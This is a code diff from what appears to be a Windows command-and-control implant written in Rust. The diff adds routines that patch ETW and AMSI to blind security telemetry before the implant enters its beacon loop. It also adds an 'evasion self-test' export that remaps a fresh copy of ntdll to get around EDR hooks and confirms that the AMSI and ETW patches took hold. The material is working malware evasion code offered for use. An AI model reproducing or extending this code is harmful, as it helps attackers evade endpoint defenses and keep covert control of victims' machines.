@@ -31,11 +31,18 @@ pub unsafe extern "system" fn nyx_entry() {
     };
     let _ssn_table = ntdll.resolve_table_owned();
 
-    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs.
-    //    This is what turns nyx_evasion from an algorithm into a live runtime.
+    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
+    //    (now over a FRESH KnownDlls\ntdll map when available — defeats inline
+    //    hooks; falls back to the hooked ntdll otherwise).
     let _syscall_rt = crate::syscalls::Runtime::init();
 
-    // 3. Enter the beacon loop (WinHTTP check-in + task loop).
+    // 3. Blind ETW (always present in ntdll) + best-effort AMSI (amsi.dll is
+    //    usually not loaded yet; the beacon loop retries it each cycle). Done
+    //    before any scanning-relevant action so telemetry is neutralized early.
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_amsi();
+
+    // 4. Enter the beacon loop (WinHTTP check-in + task loop).
     crate::beacon::beacon_loop();
 }
 
@@ -119,4 +126,77 @@ pub unsafe extern "system" fn nyx_selftest() {
         }
         None => report_exit(exit_proc, 0xE01), // no echo server; crypto alone OK
     }
+}
+
+/// **Evasion self-test entry** (benign validation of the unhook + blind tracks).
+///
+/// Runs Phase 4 (NTDLL fresh-map diff) and Phase 5 (AMSI/ETW blind byte-verify)
+/// and exits with a single code encoding both results, so an operator gets one
+/// observable number for the evasion state on a real host:
+///
+/// - Phase 4 (unhook): `0x0400 + D` where `D` = bytes differing between the
+///   fresh KnownDlls ntdll `.text` and the in-process (hooked) ntdll `.text`.
+///   `D == 0` means the host's ntdll was clean (fresh-map is a no-op but
+///   proved functional); `D > 0` means it WAS hooked and the fresh map gave us
+///   pristine bytes. `0x0FFF` = fresh map itself failed (KnownDlls unavailable).
+/// - Phase 5 (blind): `0x0500 | mask` where mask bit0 = ETW patched &
+///   byte-verified, bit1 = AMSI patched & byte-verified, bit2 = amsi.dll was
+///   present at selftest time.
+///
+/// The combined exit code is `0x0400 + D` if the fresh map worked, else falls
+/// through to Phase 5's code. To read each independently, run with the host in
+/// different states (e.g. under an EDR for D>0). Invoke via
+/// `rundll32 nyx_implant_win.dll,nyx_selftest_evasion`.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_evasion() {
+    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
+
+    // Bootstrap the allocator (Phase 2 of the main selftest does this; we need
+    // it for the fresh-map's Vec materialization).
+    crate::ntalloc::force_resolve();
+
+    // === Phase 4: NTDLL fresh-map unhook diff ===
+    let hooked_base = match LiveNtdll::locate_base() {
+        Some(b) => b,
+        None => report_exit(exit_proc, 0xFFFFFFFF),
+    };
+    match crate::unhook::fresh_ntdll_text() {
+        Some((fresh_base, text_rva, text_size)) => {
+            let diffs = crate::unhook::text_diff_count(fresh_base, hooked_base, text_rva, text_size);
+            crate::unhook::unmap_fresh(fresh_base); // RAII not available across the match
+            // Report 0x0400 + D (cap D at 0x3FF to stay in the 0x04XX band).
+            let code = 0x0400 + (diffs.min(0x3FF) as u32);
+            report_exit(exit_proc, code);
+        }
+        None => {
+            // Fresh map failed (KnownDlls ACL / low IL). Fall through to Phase 5
+            // so we still get the blind result. (The unhook-failure case is
+            // observable as the absence of a 0x04XX exit: if we reach Phase 5,
+            // the fresh map didn't succeed.)
+        }
+    }
+
+    // === Phase 5: AMSI/ETW blind byte-verify ===
+    // Patch ETW (always present) + AMSI (best-effort), then re-read the first
+    // bytes and compare to the patch to PROVE the write landed.
+    let _ = crate::blind::patch_etw();
+    let amsi_attempted = crate::blind::patch_amsi().is_ok();
+
+    let mut mask: u32 = 0;
+    // ETW byte-verify.
+    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite") {
+        if crate::blind::already_patched(addr, &crate::blind::ETW_PATCH) {
+            mask |= 0x1;
+        }
+    }
+    // AMSI byte-verify (only if amsi.dll was loaded).
+    if amsi_attempted {
+        mask |= 0x4; // amsi.dll was present
+        if let Some(addr) = crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") {
+            if crate::blind::already_patched(addr, &crate::blind::AMSI_PATCH) {
+                mask |= 0x2;
+            }
+        }
+    }
+    report_exit(exit_proc, 0x0500 | mask);
 }
